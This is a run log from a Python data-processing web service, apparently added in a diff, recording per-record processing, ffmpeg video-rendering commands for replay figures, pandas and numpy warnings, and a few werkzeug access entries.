+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2432_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2432_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2433_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2433_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2434_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2434_replay.mp4']
+INFO:root:Processing: 0464675d-d3be-45de-a17c-7333e2626b96
+Processing: 0464675d-d3be-45de-a17c-7333e2626b96
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1818
+visit_exam_id: 1818
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1821
+visit_exam_id: 1821
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1816_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1816_replay.mp4']
+INFO:root:Currently processing: 0464675d-d3be-45de-a17c-7333e2626b96<br>406 left to go
+Currently processing: 0464675d-d3be-45de-a17c-7333e2626b96<br>406 left to go
+INFO:werkzeug:201.244.239.157 - - [02/Feb/2020 19:57:08] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [02/Feb/2020 19:57:08] "GET /process HTTP/1.1" 200 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1817_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1817_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1820_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0464675d-d3be-45de-a17c-7333e2626b96/figures/1820_replay.mp4']
+INFO:root:Processing: df3f4604-22bc-44a6-899f-98fe47773695
+Processing: df3f4604-22bc-44a6-899f-98fe47773695
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2671_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2671_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2672_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2672_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2673_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2673_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2674_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2674_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2675_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/df3f4604-22bc-44a6-899f-98fe47773695/figures/2675_replay.mp4']
+INFO:werkzeug:186.249.15.178 - - [02/Feb/2020 20:13:34] "GET / HTTP/1.1" 404 -
+186.249.15.178 - - [02/Feb/2020 20:13:34] "GET / HTTP/1.1" 404 -
+INFO:root:Processing: c739634f-d3d7-430b-bec4-40ab66a84d7a
+Processing: c739634f-d3d7-430b-bec4-40ab66a84d7a
+WARNING:root:Empty data for visit_exam_id: 1913
+Empty data for visit_exam_id: 1913
+WARNING:root:Empty data for visit_exam_id: 1915
+Empty data for visit_exam_id: 1915
+WARNING:root:Empty data for visit_exam_id: 1916
+Empty data for visit_exam_id: 1916
+WARNING:root:Empty data for visit_exam_id: 1917
+Empty data for visit_exam_id: 1917
+WARNING:root:Empty data for visit_exam_id: 1918
+Empty data for visit_exam_id: 1918
+/home/ubuntu/reactrack/matviz/matviz/etl.py:340: RuntimeWarning: invalid value encountered in true_divide
+  outt = ys/enss
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c739634f-d3d7-430b-bec4-40ab66a84d7a/figures/1914_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c739634f-d3d7-430b-bec4-40ab66a84d7a/figures/1914_replay.mp4']
+INFO:root:Processing: 0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3
+Processing: 0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2600_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2600_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2601_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2601_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2602_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2602_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2603_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2603_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2604_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/0d63f8b4-4f01-4f5e-8a34-2b392f6d58d3/figures/2604_replay.mp4']
+INFO:root:Processing: 62758297-8fb4-45ec-b167-aa7f7d8b2011
+Processing: 62758297-8fb4-45ec-b167-aa7f7d8b2011
+WARNING:root:Empty data for visit_exam_id: 2612
+Empty data for visit_exam_id: 2612
+WARNING:root:Empty data for visit_exam_id: 2613
+Empty data for visit_exam_id: 2613
+WARNING:root:Empty data for visit_exam_id: 2614
+Empty data for visit_exam_id: 2614
+WARNING:root:Empty data for visit_exam_id: 2615
+Empty data for visit_exam_id: 2615
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62758297-8fb4-45ec-b167-aa7f7d8b2011/figures/2616_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62758297-8fb4-45ec-b167-aa7f7d8b2011/figures/2616_replay.mp4']
+INFO:root:Processing: 5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d
+Processing: 5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d
+WARNING:root:Empty data for visit_exam_id: 2618
+Empty data for visit_exam_id: 2618
+WARNING:root:Empty data for visit_exam_id: 2620
+Empty data for visit_exam_id: 2620
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2619_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2619_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2621_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2621_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2622_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5dca9a98-1e40-4db3-8b7e-4a12c3bfcf4d/figures/2622_replay.mp4']
+INFO:root:Processing: 6f29b11b-48f0-47a8-bfe0-dcb18662b862
+Processing: 6f29b11b-48f0-47a8-bfe0-dcb18662b862
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2588_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2588_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2589_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2589_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2590_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2590_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2591_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2591_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2592_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6f29b11b-48f0-47a8-bfe0-dcb18662b862/figures/2592_replay.mp4']
+INFO:root:Processing: c1732973-0764-4ffd-931a-0aad061e8881
+Processing: c1732973-0764-4ffd-931a-0aad061e8881
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1757_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1757_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1758_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1758_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1759_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1759_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1760_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1760_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1761_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c1732973-0764-4ffd-931a-0aad061e8881/figures/1761_replay.mp4']
+INFO:root:Processing: 03226b75-bae4-4095-b59d-77e7cf8bde02
+Processing: 03226b75-bae4-4095-b59d-77e7cf8bde02
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1699_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1699_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1700_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1700_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1701_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1701_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1702_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1702_replay.mp4']
+INFO:root:Currently processing: 03226b75-bae4-4095-b59d-77e7cf8bde02<br>398 left to go
+Currently processing: 03226b75-bae4-4095-b59d-77e7cf8bde02<br>398 left to go
+INFO:werkzeug:73.68.195.204 - - [02/Feb/2020 21:43:02] "GET /process HTTP/1.1" 200 -
+73.68.195.204 - - [02/Feb/2020 21:43:02] "GET /process HTTP/1.1" 200 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1703_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/03226b75-bae4-4095-b59d-77e7cf8bde02/figures/1703_replay.mp4']
+INFO:root:Processing: 29d949e4-9034-46d5-9219-c3b56af1786d
+Processing: 29d949e4-9034-46d5-9219-c3b56af1786d
+WARNING:root:Empty data for visit_exam_id: 2027
+Empty data for visit_exam_id: 2027
+WARNING:root:Empty data for visit_exam_id: 2028
